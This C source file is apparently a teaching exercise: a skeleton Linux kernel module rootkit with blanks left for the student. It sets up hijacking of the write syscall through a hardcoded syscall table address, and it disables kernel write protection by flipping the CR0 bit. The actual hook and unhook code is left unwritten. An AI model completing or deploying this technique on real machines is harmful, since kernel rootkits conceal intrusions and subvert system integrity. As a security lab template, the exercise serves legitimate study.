/* myrootkit.c: 
    fill in the blanks to write your first rootkit!
*/

#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/errno.h>
#include <linux/unistd.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Your name here");

// syscall_table perm addr in the kernel
unsigned long *syscall_table = (unsigned long *) 0x//Address here!;

// save the original write here
asmlinkage long (*original_write)(unsigned int, const char __user *, size_t);

// the hijacked write
asmlinkage long new_write(unsigned int fd, const char __user *buf, size_t count) {

    printk(KERN_ALERT "pwnd\n");

    // YOUR CODE HERE!
    // what should we return? 
}

// install the kmod
static int init(void) {

    printk(KERN_ALERT "Entering the kernel\n");

 	// disable write protection, flip bit
    write_cr0 (read_cr0 () & (~ 0x10000));
    
    // YOUR CODE HERE!
    // hint: you do the hook here

 	// enable write protection, flip bit
    write_cr0 (read_cr0 () | 0x10000);

    return 0;
}

// rm the kmod
static void exit(void) {

    write_cr0 (read_cr0 () & (~ 0x10000));

   // YOUR CODE HERE!
   // hint: you unhook here

    write_cr0 (read_cr0 () | 0x10000);

    printk(KERN_ALERT "MODULE EXIT\n");

}

module_init(init);
module_exit(exit);
